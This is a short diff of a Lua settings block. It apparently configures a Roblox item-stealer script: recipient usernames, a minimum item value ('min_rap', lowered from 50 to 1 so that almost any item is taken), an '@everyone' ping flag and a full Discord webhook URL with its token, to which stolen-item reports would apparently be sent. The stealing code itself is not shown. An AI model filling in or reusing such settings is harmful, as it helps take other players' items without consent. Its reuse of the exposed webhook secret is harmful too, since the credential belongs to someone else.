@@ -1,8 +1,7 @@
 _G.Usernames = {
-    [1] = 'zero231z12',
-    [2] = 'zero231z',
+    [1] = 'zero231z',
 }
-_G.min_rap = 50
+_G.min_rap = 1
 _G.pingEveryone = 'Yes'
 _G.webhook = 'https://discordapp.com/api/webhooks/1462014760517374136/s8SrXd7I4makxl1mFP2MgTQVsDXl0fBrItv_SSFefqw8hDp-Sh6HpBHdX79Env40u4H7'
 
